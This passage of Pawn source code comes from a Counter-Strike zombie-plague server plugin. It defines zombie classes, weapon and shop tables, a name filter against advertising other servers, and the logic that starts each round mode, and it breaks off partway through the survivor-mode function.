#include zombie_plague_remake
#include sqlx

#pragma compress 1
#pragma dynamic 8000000
#pragma tabsize 0

enum timeUnit
{
	timeUnit_None = 0,
	timeUnit_Seconds,
	timeUnit_Minutes,
	timeUnit_Hours,
	timeUnit_Days,
	timeUnit_Weeks,
	timeUnit_Count
};

const PRIMARY_WEAPONS_BIT_SUM = (1<<CSW_SCOUT)|(1<<CSW_XM1014)|(1<<CSW_MAC10)|(1<<CSW_AUG)|(1<<CSW_UMP45)|(1<<CSW_SG550)|(1<<CSW_GALIL)|(1<<CSW_FAMAS)|(1<<CSW_AWP)|(1<<CSW_MP5NAVY)|(1<<CSW_M249)|(1<<CSW_M3)|(1<<CSW_M4A1)|(1<<CSW_TMP)|(1<<CSW_G3SG1)|(1<<CSW_SG552)|(1<<CSW_AK47)|(1<<CSW_P90);
const SECONDARY_WEAPONS_BIT_SUM = (1<<CSW_P228)|(1<<CSW_ELITE)|(1<<CSW_FIVESEVEN)|(1<<CSW_USP)|(1<<CSW_GLOCK18)|(1<<CSW_DEAGLE);

new const g_szDefaultName[ ] = "NewLifeZm.CsOutStanding.Com";

new g_szRestrictedThings[ ][ ] =
{
	"cs.",
	"street",
	"newlife",
	"csblackdevil",
	"<Warrior> Player",
	"gametracker",
	"`",
	"~",
	".com",
	".net",
	".org",
	".co",
	".info",
	".eu",
	".ge",
	".biz",
	".il",
	".li",
	".ro",
	". es",
	". fr",
	". biz",
	". ge",
	". eu",
	". li",
	". il",
	". com",
	". co",
	". net",
	". org",
	". info",
	". br",
	". ro",
	"www",
	"w w",
	"w  w",
	"w   w",
	":27",
	"goto",
	"go to",
	": 27",
	": 2 7",
	":  27",
	":  2 7",
	":  2  7",
	":  2",
	":29",
	": 29",
	": 2 9",
	":  29",
	":  2 9",
	"89.",
	"8   9",
	"8  9",
	"8    9",
	"8     9",
	"8,9.",
	"8,9 .",
	"8, 9 .",
	"89 .",
	"8 9 .",
	"188.",
	"188 .",
	"1 8 8",
	". c o m",
	"player",
	".c om",
	"http:",
	"http :",
	"h t t",
	"-serv",
	"hns",
	"jailbreak",
	". 1",
	".  1",
	".   1",
	". 2",
	".  2",
	".   2",
	". 3",
	".  3",
	".   3",
	". 4",
	".  4",
	".   4",
	". 5",
	".  5",
	".   5",
	". 6",
	".  6",
	".   6",
	". 7",
	".  7",
	".   7",
	". 8",
	".  8",
	".   8",
	". 9",
	".  9",
	".   9",
	". 0",
	".  0",
	".   0",
	"cutita",
	"c u t",
	".   ro",
	".  ro",
	".178",
	"27015",
	"connect",
	"admini f",
	"admins f",
	"admin f",
	"c o n",
	"c o  n",
	"c on",
	"c  o",
	"c   o",
	"c    o",
	"c s .",
	"c s.",
	"c s  .",
	"c  s",
	"c   s",
	"c    s"	
}

new const szObjectives[][] =
{
	"func_bomb_target",
	"info_bomb_target",
	"info_vip_start",
	"func_vip_safetyzone",
	"func_escapezone",
	"hostage_entity",
	"monster_scientist",
	"func_hostage_rescue",
	"info_hostage_rescue",
	"env_fog",
	"env_rain",
	"env_snow"
}

new g_pZombieFall[2][0] = 
{ 
    "ZombieOutstanding/zombie_hit_01.wav",
	"ZombieOutstanding/zombie_hit_03.wav"
};

new g_pZombieHitNormal[4][0] = 
{ 
    "weapons/knife_hit1.wav", 
    "weapons/knife_hit2.wav", 
    "weapons/knife_hit3.wav", 
    "weapons/knife_hit4.wav" 
};

new g_pZombieMissSlash[2][0] = 
{ 
    "weapons/knife_slash1.wav", 
    "weapons/knife_slash2.wav" 
};

new g_pZombieMissWall[2][0] = 
{ 
    "weapons/knife_slash1.wav", 
    "weapons/knife_slash2.wav" 
};

new g_pZombieDieSounds[5][0] = 
{
	"ZombieOutstanding/zombie_die_01.wav",
	"ZombieOutstanding/zombie_die_02.wav",
	"ZombieOutstanding/zombie_die_03.wav",
	"ZombieOutstanding/zombie_die_04.wav",
	"ZombieOutstanding/zombie_die_05.wav"
};

new g_pMonsterHitSounds[3][0] = 
{
	"ZombieOutstanding/monster_hit_01.wav",
	"ZombieOutstanding/monster_hit_02.wav",
	"ZombieOutstanding/monster_hit_03.wav"
};

new g_pZombieHitSounds[5][0] = 
{
	"ZombieOutstanding/zombie_hit_01.wav",
	"ZombieOutstanding/zombie_hit_02.wav",
	"ZombieOutstanding/zombie_hit_03.wav",
	"ZombieOutstanding/zombie_hit_04.wav",
	"ZombieOutstanding/zombie_hit_05.wav"
};

new g_cZombieInfectSounds[5][0] =
{
    "ZombieOutstanding/zombie_infect_01.wav",
    "ZombieOutstanding/zombie_infect_02.wav",
    "ZombieOutstanding/zombie_infect_03.wav",
    "ZombieOutstanding/zombie_infect_04.wav",
    "ZombieOutstanding/zombie_infect_05.wav"
};

new g_cEndRoundZombieSounds[4][0] =
{
    "ZombieOutstanding/end_round_win_zombies_01.wav",
    "ZombieOutstanding/end_round_win_zombies_02.wav",
    "ZombieOutstanding/end_round_win_zombies_03.wav",
    "ZombieOutstanding/end_round_win_zombies_04.wav"
};
new g_cEndRoundHumanSounds[3][0] =
{
    "ZombieOutstanding/end_round_win_humans_01.wav",
    "ZombieOutstanding/end_round_win_humans_02.wav",
    "ZombieOutstanding/end_round_win_humans_03.wav"
};

new g_cStartRoundSurvivorSounds[2][0] =
{
    "ZombieOutstanding/round_start_survivor_01.wav",
    "ZombieOutstanding/round_start_survivor_02.wav"
};
new g_cStartRoundNemesisSounds[2][0] =
{
    "ZombieOutstanding/round_start_nemesis_01.wav",
    "ZombieOutstanding/round_start_nemesis_02.wav"
};

new g_cHumanNadeInfectSounds[3][0] =
{
    "ZombieOutstanding/human_nade_infect_scream_01.wav",
    "ZombieOutstanding/human_nade_infect_scream_02.wav",
    "ZombieOutstanding/human_nade_infect_scream_03.wav"
};

new g_cZombieBurnSounds[5][0] =
{
    "ZombieOutstanding/zombie_burn_01.wav",
    "ZombieOutstanding/zombie_burn_02.wav",
    "ZombieOutstanding/zombie_burn_03.wav",
    "ZombieOutstanding/zombie_burn_04.wav",
    "ZombieOutstanding/zombie_burn_05.wav"
};
new g_cHumanModels[4][0] =
{
    "terror",
    "gign",
    "sas",
    "arctic"
};
new g_cZombieModels[7][0] =
{
    "z_out_clasic",
    "z_out_raptor",
    "z_out_mutant",
    "z_out_tight",
    "z_out_regenerator",
    "z_out_predator_blue",
    "z_out_hunter"
};
new g_cZombieClaws[7][0] =
{
    "models/ZombieOutstanding/z_out_clasic_claws.mdl",
    "models/ZombieOutstanding/z_out_raptor_claws.mdl",
    "models/ZombieOutstanding/z_out_mutant_claws.mdl",
    "models/ZombieOutstanding/z_out_tight_claws.mdl",
    "models/ZombieOutstanding/z_out_raptor_claws.mdl",
    "models/ZombieOutstanding/z_out_predator_blue_claws.mdl",
    "models/ZombieOutstanding/z_out_hunter_claws.mdl"
};
new g_iZombieHealths[7] =
{
    6000, 5250, 7500, 4250, 5500, 6000, 5450
}
new Float:g_fZombieGravities[7] =
{
    1.00, 0.94, 1.09, 0.57, 1.00, 0.74, 0.60
}
new Float:g_fZombieSpeeds[7] =
{
    264.0, 309.0, 244.0, 259.0, 249.0, 279.0, 274.0
}
new Float:g_fZombieKnockbacks[7] =
{
    0.82, 1.29, 0.43, 1.0, 0.88, 0.68, 0.83
}
new g_cZombieClasses[7][14] =
{
    "Clasic",
    "Raptor",
    "Mutant",
    "Tight",
    "Regenerator",
    "Predator Blue",
    "Hunter"
};
new g_cZombieAttribs[7][0] =
{
    "\r[=Balanced=]",
    "\r[Speed +++]",
    "\r[Health +++]",
    "\r[Double Jump]",
    "\r[Regeneration]",
    "\r[Powerful]",
    "\r[Silent Killer]"
};

new g_cSecondaryWeapons[6][0] =
{
    "USP",
    "GLOCK18",
    "P228",
    "DEAGLE",
    "ELITE",
    "FIVESEVEN"
};
new g_cPrimaryWeapons[10][0] =
{
    "GALIL",
    "FAMAS",
    "M4A1",
    "AK47",
    "AUG",
    "SG552",
    "XM1014",
    "M3",
    "MP5NAVY",
    "P90"
};
new g_cSecondaryEntities[6][0] =
{
    "weapon_usp",
    "weapon_glock18",
    "weapon_p228",
    "weapon_deagle",
    "weapon_elite",
    "weapon_fiveseven"
};
new g_cPrimaryEntities[10][0] =
{
    "weapon_galil",
    "weapon_famas",
    "weapon_m4a1",
    "weapon_ak47",
    "weapon_aug",
    "weapon_sg552",
    "weapon_xm1014",
    "weapon_m3",
    "weapon_mp5navy",
    "weapon_p90"
};

new const Float: g_flCoords[8][0] =
{
    { 0.50, 0.40 },
    { 0.56, 0.44 },
    { 0.60, 0.50 },
    { 0.56, 0.56 },
    { 0.50, 0.60 },
    { 0.44, 0.56 },
    { 0.40, 0.50 },
    { 0.44, 0.44 }
};

new Float:kb_weapon_power[] = 
{
	-1.0,
	2.4,
	-1.0,
	6.5,
	-1.0,
	8.0,
	-1.0,
	2.3,
	5.0,
	-1.0,
	2.4,
	2.0,
	2.4,
	5.3,
	5.5,
	5.5,
	2.2,
	2.0,
	10.0,
	2.5,
	5.2,
	8.0,
	5.0,
	2.4,
	6.5,
	-1.0,
	5.3,
	5.0,
	6.0,
	-1.0,
	2.0
}

new const MAXCLIP[] = 
{ 
    -1, 
	13,
	-1,
	10, 
	1, 
	7, 
	-1, 
	30, 
	30, 
	1, 
	30, 
	20, 
	25, 
	30, 
	35, 
	25, 
	12, 
	20,
	10, 
	30, 
	100,
	8, 
	30,
	30, 
	20, 
	2, 
	7, 
	30, 
	30, 
	-1, 
	50 
};

new const Float:sizez[][3] = 
{
    {0.0, 0.0, 1.0}, 
	{0.0, 0.0, -1.0}, 
	{0.0, 1.0, 0.0}, 
	{0.0, -1.0, 0.0}, 
	{1.0, 0.0, 0.0}, 
	{-1.0, 0.0, 0.0}, 
	{-1.0, 1.0, 1.0},
	{1.0, 1.0, 1.0}, 
	{1.0, -1.0, 1.0}, 
	{1.0, 1.0, -1.0}, 
	{-1.0, -1.0, 1.0}, 
	{1.0, -1.0, -1.0}, 
	{-1.0, 1.0, -1.0}, 
	{-1.0, -1.0, -1.0},
    {0.0, 0.0, 2.0}, 
	{0.0, 0.0, -2.0}, 
	{0.0, 2.0, 0.0}, 
	{0.0, -2.0, 0.0}, 
	{2.0, 0.0, 0.0}, 
	{-2.0, 0.0, 0.0}, 
	{-2.0, 2.0, 2.0}, 
	{2.0, 2.0, 2.0}, 
	{2.0, -2.0, 2.0}, 
	{2.0, 2.0, -2.0}, 
	{-2.0, -2.0, 2.0},
	{2.0, -2.0, -2.0}, 
	{-2.0, 2.0, -2.0}, 
	{-2.0, -2.0, -2.0},
    {0.0, 0.0, 3.0}, 
	{0.0, 0.0, -3.0}, 
	{0.0, 3.0, 0.0}, 
	{0.0, -3.0, 0.0}, 
	{3.0, 0.0, 0.0}, 
	{-3.0, 0.0, 0.0}, 
	{-3.0, 3.0, 3.0},
	{3.0, 3.0, 3.0}, 
	{3.0, -3.0, 3.0}, 
	{3.0, 3.0, -3.0}, 
	{-3.0, -3.0, 3.0}, 
	{3.0, -3.0, -3.0}, 
	{-3.0, 3.0, -3.0}, 
	{-3.0, -3.0, -3.0},
    {0.0, 0.0, 4.0}, 
	{0.0, 0.0, -4.0}, 
	{0.0, 4.0, 0.0}, 
	{0.0, -4.0, 0.0}, 
	{4.0, 0.0, 0.0}, 
	{-4.0, 0.0, 0.0}, 
	{-4.0, 4.0, 4.0}, 
	{4.0, 4.0, 4.0}, 
	{4.0, -4.0, 4.0},
	{4.0, 4.0, -4.0}, 
	{-4.0, -4.0, 4.0}, 
	{4.0, -4.0, -4.0}, 
	{-4.0, 4.0, -4.0}, 
	{-4.0, -4.0, -4.0},
    {0.0, 0.0, 5.0}, 
	{0.0, 0.0, -5.0}, 
	{0.0, 5.0, 0.0}, 
	{0.0, -5.0, 0.0}, 
	{5.0, 0.0, 0.0}, 
	{-5.0, 0.0, 0.0}, 
	{-5.0, 5.0, 5.0}, 
	{5.0, 5.0, 5.0}, 
	{5.0, -5.0, 5.0}, 
	{5.0, 5.0, -5.0}, 
	{-5.0, -5.0, 5.0}, 
	{5.0, -5.0, -5.0}, 
	{-5.0, 5.0, -5.0}, 
	{-5.0, -5.0, -5.0}
}; 

new g_cShopItems[8][0] =
{
    "Double Damage",
    "Buy Server Slot",
    "Buy Admin Model",
    "100 Ammo Packs",
    "200 Ammo Packs",
    "300 Ammo Packs",
    "God Mode",
    "1000 Points"
};
new g_iShopItemsPrices[8] =
{
    120, 700, 2250, 160, 200, 280, 150, 450
}
new g_iShopItemsTeams[8] =
{
    2, 0, 0, 0, 0, 0, 2, 0
}
new g_cShopItemsPrices[8][0] =
{
    "\r[120 points]",
    "\r[700 points]\y (Recommended)",
    "\r[2250 points]",
    "\r[160 points]",
    "\r[200 points]",
    "\r[280 points]",
    "\r[150 points]",
    "\r[500 ammo packs]\y (Special)"
};

new g_cExtraItems[25][0] =
{
    "Antidote",
    "Fire Grenade",
    "Freeze Grenade",
    "Explosion Grenade",
    "Infection Grenade",
    "Killing Grenade",
    "M249 Machine Gun",
    "G3SG1 Auto Sniper Rifle",
    "SG550 Auto Sniper Rifle",
    "AWP Sniper Rifle",
    "Nightvision Googles",
    "Zombie Madness",
    "Jetpack + Bazooka",
    "Unlimited Clip",
    "Armor\y (100ap)",
    "Armor\y (200ap)",
    "Multijump +1",
    "Tryder",
	"Golden Kalashnikov\y (AK-47)",
	"Golden Deagle\y (Night Hawk)",
    "Survivor",
    "Sniper",
    "Nemesis",
    "Assassin",
    "Knife Blink"
};
new g_iExtraItemsPrices[25] =
{
    15, 4, 3, 4, 26, 30, 9, 11, 10, 9, 2, 15, 30, 10, 5, 10, 5, 30, 36, 20, 180, 175, 140, 140, 10
}
new g_cExtraItemsPrices[25][0] =
{
    "\r[15 packs]",
    "\r[4 packs]",
    "\r[3 packs]",
    "\r[4 packs]",
    "\r[26 packs]",
    "\r[42 packs]",
    "\r[9 packs]",
    "\r[11 packs]",
    "\r[10 packs]",
    "\r[9 packs]",
    "\r[2 packs]",
    "\r[15 packs]",
    "\r[30 packs]",
    "\r[10 packs]",
    "\r[5 packs]",
    "\r[10 packs]",
    "\r[5 packs]",
    "\r[30 packs]",
    "\r[36 packs]",
    "\r[20 packs]",
    "\r[180 packs]",
    "\r[175 packs]",
    "\r[140 packs]",
    "\r[140 packs]",
    "\r[10 packs]"
};
new g_iExtraItemsTeams[25] =
{
    1, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 1
}

new bool:g_bConnected[33], g_cName[33][32], bool:g_bAlive[33], bool:g_bZombie[33], g_iMaxClients, bool:g_bRoundEnd, g_iPlayerType[33], g_iAntidoteSync,  g_iZombieNextClass[33], bool:g_bFake[33],  g_iZombieClass[33], g_iGameMenu, 

g_iMenuZombieClasses, g_iWeapon[33], bool:g_bRoundStart, g_iRoundType, g_iTopMessageSync, g_iRoundsCount, g_iRounds[1024], g_iCounter, g_iCounterMessage, g_iAliveCount, g_iLastMode, Float:g_fLastLeapTime[33], bool:g_bFlash[33], 

bool:g_bFlashEnabled[33], Float:g_fLastTime[33], g_iSecondaryMenu, g_iPrimaryMenu, g_iSecondaryWeapons[64], g_iPrimaryWeapons[64], bool:g_bNoDamage[33], g_iPosition[33], g_bFrozen[33], g_iJumps[33], g_iMaxJumps[33], g_iPacks[33], 

Float:g_fDamage[33], g_iShopMenu, g_iPoints[33], g_iCenterMessageSync, g_iDownMessageSync, g_cClass[33][14], FreezeTime, g_iMenu, g_iVersusSync, Array:g_aNameData, Array:g_aAmmoData, g_iShopEventHudmessage, bool:g_bDoubleDamage[33], 

bool:g_bServerSlot[33], bool:g_bAdminModel[33], g_iMenuExtraItems, Float:g_fLastChangedModel, g_bUnlimitedClip[33], bool:g_bTryder[33], g_iEventsHudmessage, g_iSurvivors, g_iModeRecordings, g_cModeRecordings[52][32], Float:g_fRoundStartTime, 

g_iSnipers, g_iBlinks[33], Float:g_fGagTime[33], bool:g_bGolden[33], bool:g_bGoldenDeagle[33], SpriteTexture, bool:g_bGaveThisRound[33], iFwSpawnHook, g_iLaser, g_cRegisteredCharacter[32],  g_Secret[32], Array:g_vname, Array:g_vflags,  Array:g_vpwd, 

bool:g_vip[33], g_vip_flags[33][32], jumpnum[33] = 0, bool:dojump[33] = false, ExploSpr, FlameSpr, SmokeSpr, GlassSpr, HExplode, g_iBurningDuration[33], TrailSpr, bool:g_bKilling[33],  on_stuck[33], g_iTripMines[ 33 ], g_iPlantedMines[ 33 ], g_iPlanting[ 33 ], 

g_iRemoving[ 33 ], g_hExplode, g_iMineMessage, g_iSecondMineMessage, g_iKillsThisRound[33], g_cQuery[256], bool:g_bRanked[33], Float:g_fLastRankQuery, g_iRemainingSync, SwitchingTeam, bool:g_bModeStarted,  g_iRegenerationSync, g_roundend, g_iOffset[ 33 ][ 2 ], 

g_iArgumentPing[ 33 ][ 3 ], g_iPingOverride[ 33 ] = { -1, ... }, g_iPing, g_iFlux, g_ip[33][64], g_steam[33][64], g_iEnemy[33], Float:g_fLastSlash[33], g_iCanceled[33], g_iSlash[33], g_iInBlink[33], g_cPlayerAddress[33][24], g_cLNames[10][32], Float:g_fLast[33], 

g_iSize, g_iTracker, g_cAddresses[10][24], g_cNames[10][32], g_iVariable, g_iTimeLimit, g_iAdvertisementsCount, g_cHudAdvertisements[50][188], g_iHudAdvertisementsCount, g_iMessage, g_iHudMessage, g_cAdvertisements[72][188], g_vault=-1, TaskReward[33],

Float:TeamsTargetTime;

static Handle:g_Tuple = Empty_Handle;
static g_Query[1024] = { 0, ... };
static g_Name[33][64];
static g_Steam[33][64];
static g_Ip[33][64];
static g_seenString[33][64];
static g_timeString[33][64];
static g_Time[33] = { 0, ... };
static g_Score[33] = { 0, ... };
static g_Seen[33] = { 0, ... };
static g_Kills[33] = { 0, ... };
static g_Deaths[33] = { 0, ... };
static g_headShots[33] = { 0, ... };
static g_kmdValue[33] = { 0, ... };
static Float:g_kpdRatio[33] = { 0.0, ... };
static g_recordsCount = 0;

StartSwarmMode(bool:bForced)
{
	if ((g_iAliveCount > 9 && g_iLastMode != 64 && random_num(1, 22) == 1 && !g_iRounds[g_iRoundsCount]) || bForced)
	{
		g_iLastMode = 64;
		g_iRoundType = g_iRoundType | 64;
		static i;
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (!g_bAlive[i] || fm_cs_get_user_team(i) == FM_CS_TEAM_CT)
			{
				remove_task(i + TASK_TEAM);
				fm_cs_set_user_team(i, FM_CS_TEAM_CT);
				fm_user_team_update(i);
			}
			else
			{
				MakeZombie(0, i, true, false, false);
			}
			i += 1;
		}
		client_cmd(0, "spk ZombieOutstanding/round_start_plague");
		set_hudmessage(20, 255, 20, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Swarm Round !!");
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartPlagueMode(false);
	return 0;
}

StartPlagueMode(bool:bForced)
{
	if ((g_iAliveCount > 9 && g_iLastMode != 32 && random_num(1, 28) == 1 && !g_iRounds[g_iRoundsCount]) || bForced)
	{
		g_iLastMode = 32;
		g_iRoundType = g_iRoundType | 32;
		static iNemesis;
		static iMaxNemesis;
		static i;
		static iMaxSurvivors;
		static iSurvivors;
		static iMaxZombies;
		static iZombies;
		iMaxSurvivors = 3;
		iMaxNemesis = 2;
		iZombies = 0;
		iNemesis = 0;
		iSurvivors = 0;
		while (iSurvivors < iMaxSurvivors)
		{
			i = GetRandomAlive();
			if (!(g_iPlayerType[i] & 4))
			{
				MakeHuman(i, true, false);
				iSurvivors += 1;
				set_user_health(i, 5750);
			}
		}
		while (iNemesis < iMaxNemesis)
		{
			i = GetRandomAlive();
			if (!(g_iPlayerType[i] & 4 || g_iPlayerType[i] & 1))
			{
				MakeZombie(0, i, false, true, false);
				iNemesis += 1;
				set_user_health(i, 107500);
			}
		}
		iMaxZombies = floatround(0.40 * g_iAliveCount + -5, floatround_floor);
		while (iZombies < iMaxZombies)
		{
			i += 1;
			if (i > g_iMaxClients)
			{
				i = 1;
			}
			if (!(!g_bAlive[i] || g_bZombie[i] || g_iPlayerType[i] & 4))
			{
				if (random_num(0, 1))
				{
					MakeZombie(0, i, true, false, false);
					iZombies += 1;
				}
			}
		}
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (!g_bAlive[i] || g_bZombie[i] || g_iPlayerType[i] & 4)
			{
			}
			else
			{
				if (fm_cs_get_user_team(i) == FM_CS_TEAM_CT)
				{
				    remove_task ( i + TASK_TEAM );
				    fm_cs_set_user_team ( i, FM_CS_TEAM_CT);
				    fm_user_team_update ( i );
				}
			}
			i += 1;
		}
		client_cmd(0, "spk ZombieOutstanding/round_start_plague");
		set_hudmessage(0, 50, 200, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Plague Round !!");
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartMultiMode(false);
	return 0;
}

StartMultiMode(bool:bForced)
{
	if ((g_iAliveCount > 9 && g_iLastMode != 16 && random_num(1, 24) == 1 && !g_iRounds[g_iRoundsCount]) || bForced)
	{
		g_iLastMode = 16;
		g_iRoundType = g_iRoundType | 16;
		static i;
		static iMaxZombies;
		static iZombies;
		iZombies = 0;
		iMaxZombies = floatround(0.18 * g_iAliveCount, floatround_ceil);
		i = random_num(1, g_iMaxClients);
		while ( iZombies < iMaxZombies )
		{
			if ( ++ i > g_iMaxClients ) i = 1;

			if ( !g_bAlive [i] || g_bZombie [i] ) continue;
			
			if ( random_num ( 0, 1 ) )
			{
				MakeZombie(0, i, true, false, false);
				
				iZombies ++;
			}
		}		
		for ( i = 1; i <= g_iMaxClients; i ++ )
		{
			if ( !g_bAlive [i] || g_bZombie [i] ) continue;

			if ( fm_cs_get_user_team ( i ) != FM_CS_TEAM_CT )
			{
				remove_task ( i + TASK_TEAM );
				fm_cs_set_user_team ( i, FM_CS_TEAM_CT );
				fm_user_team_update ( i );
			}
		}		
		client_cmd(0, "spk ZombieOutstanding/round_start_plague");
		set_hudmessage(200, 50, 0, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Multiple Infections !!");
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartArmageddonMode(false);
	return 0;
}

StartArmageddonMode(bool:bForced)
{
	if ((g_iAliveCount > 9 && g_iLastMode != 128 && random_num(1, 33) == 1 && !g_iRounds[g_iRoundsCount]) || bForced)
	{
		g_iLastMode = 128;
		g_iRoundType = g_iRoundType | 128;
		static i;
		static iMaxZombies;
		static iZombies;
		iZombies = 0;
		iMaxZombies = floatround(0.44 * g_iAliveCount, floatround_floor);
		i = random_num(1, g_iMaxClients);
		while (iZombies < iMaxZombies)
		{
			i += 1;
			if (i > g_iMaxClients)
			{
				i = 1;
			}
			if (!(!g_bAlive[i] || g_bZombie[i]))
			{
				if (random_num(0, 1))
				{
					MakeZombie(0, i, false, true, false);
					set_user_health(i, 100000);
					iZombies += 1;
				}
			}
		}
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (!g_bAlive[i] || g_bZombie[i])
			{
			}
			else
			{
				MakeHuman(i, true, false);
				set_user_health(i, 8750);
			}
			i += 1;
		}
		if (random_num(0, 1))
		{
            client_cmd(0, "spk %s", g_cStartRoundSurvivorSounds[random_num(0, 1)]);
		}
		else
		{
            client_cmd(0, "spk %s", g_cStartRoundNemesisSounds[random_num(0, 1)]);
		}
		set_hudmessage(181, 62, 244, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Armageddon Round !!");
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartNightmareMode(false);
	return 0;
}

StartNightmareMode(bool:bForced)
{
	if ((g_iAliveCount > 9 && g_iLastMode != 256 && random_num(1, 36) == 1 && !g_iRounds[g_iRoundsCount]) || bForced)
	{
		g_iLastMode = 256;
		g_iRoundType = g_iRoundType | 256;
		static i;
		static iMaxAssassins;
		static iAssassins;
		static iMaxSnipers;
		static iSnipers;
		static iMaxNemesis;
		static iNemesis;
		iAssassins = 0;
		iSnipers = 0;
		iNemesis = 0;
		iMaxNemesis = floatround(0.24 * g_iAliveCount, floatround_floor);
		iMaxAssassins = floatround(0.24 * g_iAliveCount, floatround_floor);
		iMaxSnipers = floatround(0.25 * g_iAliveCount, floatround_ceil);
		i = random_num(1, g_iMaxClients);
		while (iNemesis < iMaxNemesis)
		{
			i += 1;
			if (i > g_iMaxClients)
			{
				i = 1;
			}
			if (!(!g_bAlive[i] || g_bZombie[i]))
			{
				if (random_num(0, 1))
				{
					MakeZombie(0, i, false, true, false);
					set_user_health(i, 105000);
					iNemesis += 1;
				}
			}
		}
		while (iAssassins < iMaxAssassins)
		{
			i += 1;
			if (i > g_iMaxClients)
			{
				i = 1;
			}
			if (!(!g_bAlive[i] || g_bZombie[i]))
			{
				if (random_num(0, 1))
				{
					MakeZombie(0, i, false, false, true);
					set_user_health(i, 21000);
					iAssassins += 1;
				}
			}
		}
		while (iSnipers < iMaxSnipers)
		{
			i += 1;
			if (i > g_iMaxClients)
			{
				i = 1;
			}
			if (!(!g_bAlive[i] || g_bZombie[i] || g_iPlayerType[i] & 8))
			{
				if (random_num(0, 1))
				{
					MakeHuman(i, false, true);
					set_user_health(i, 10500);
					iSnipers += 1;
				}
			}
		}
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (!g_bAlive[i] || g_bZombie[i] || g_iPlayerType[i] & 8 || g_iPlayerType[i] & 4)
			{
			}
			else
			{
				MakeHuman(i, true, false);
				set_user_health(i, 12500);
			}
			i += 1;
		}
		if (random_num(0, 1))
		{
            client_cmd(0, "spk %s", g_cStartRoundSurvivorSounds[random_num(0, 1)]);
		}
		else
		{
            client_cmd(0, "spk %s", g_cStartRoundNemesisSounds[random_num(0, 1)]);
		}
		set_hudmessage(241, 15, 244, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Nightmare Round !!");
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartAssassinsVsSnipersMode(false);
	return 0;
}

StartAssassinsVsSnipersMode(bool:bForced)
{
	if ((g_iAliveCount > 9 && g_iLastMode != 512 && random_num(1, 37) == 1 && !g_iRounds[g_iRoundsCount]) || bForced)
	{
		g_iLastMode = 512;
		g_iRoundType = g_iRoundType | 512;
		static i;
		i = 1;
		while (g_iMaxClients + 1 > i)
		{
			if (g_bAlive[i])
			{
				switch (fm_cs_get_user_team(i))
				{
					case 1:
					{
						MakeZombie(0, i, false, false, true);
						set_user_health(i, 31000);
					}
					case 2:
					{
						MakeHuman(i, false, true);
						set_user_health(i, 3850);
					}
					default:
					{
					}
				}
			}
			i += 1;
		}
		if (random_num(0, 1))
		{
            client_cmd(0, "spk %s", g_cStartRoundSurvivorSounds[random_num(0, 1)]);
		}
		else
		{
            client_cmd(0, "spk %s", g_cStartRoundNemesisSounds[random_num(0, 1)]);
		}
		set_hudmessage(221, 13, 64, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "Assassins vs Snipers Round !!");
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	static cTime[4];
	get_time("%H", cTime, 3);
	if (cTime[0] != 48)
	{
		StartSniperMode(0);
	}
	else
	{
		if (cTime[0] == 48 && cTime[1] == 49)
		{
			StartSniperMode(0);
		}
		if (cTime[0] == 48 && cTime[1] == 50)
		{
			StartSniperMode(0);
		}
		StartAssassinMode(0);
	}
	return 0;
}

StartSniperMode(iPlayer)
{
	if ((g_iLastMode != 8 && random_num(1, 35) == 1 && !g_iRounds[g_iRoundsCount]) || iPlayer)
	{
		g_iLastMode = 8;
		g_iRoundType = g_iRoundType | 8;
		static j;
		static i;
		i = GetRandomAlive();
		if (iPlayer)
		{
			i = iPlayer;
		}
		j = i;
		MakeHuman(i, false, true);
		for ( i = 1; i <= g_iMaxClients; i ++ )
		{
			if ( !g_bAlive [i] ) continue;

			if ( g_iPlayerType[i] & 8 || g_bZombie [i] ) continue;
			
			MakeZombie(0, i, true, false, false);
		}		
		client_cmd(0, "spk %s", g_cStartRoundSurvivorSounds[random_num(0, 1)]);
		set_hudmessage(221, 13, 64, -1.00, 0.17, 1, 0.00, 5.00, 1.00, 1.00, -1);
		ShowSyncHudMsg(0, g_iTopMessageSync, "%s is Sniper !!", g_cName[j]);
		remove_task(600, 0);
		set_task(2.0, "TaskAmbience", 600, "", 0, "", 0);
		g_bModeStarted = true;
		return 0;
	}
	StartSurvivorMode(0);
	return 0;
}

StartSurvivorMode(iPlayer)
{
	if ((g_iLastMode != 4 && random_num(1, 35) == 1 && !g_iRounds[g_iRoundsCount]) || iPlayer)
	{
		g_iLastMode = 4;
		g_iRoundType = g_iRoundType | 4;
		static j;
		static i;
		i = GetRandomAlive();
		if (iPlayer)
		{
			i = iPlayer;
		}
		j = i;
		MakeHuman(i, true, false);
		for ( i = 1; i <= g_iMaxClients; i ++ )
		{
			if ( !g_bAlive [i] ) continue;

			if ( g_iPlayerType[i] & 4 || g_bZombie [i] ) continue;
			
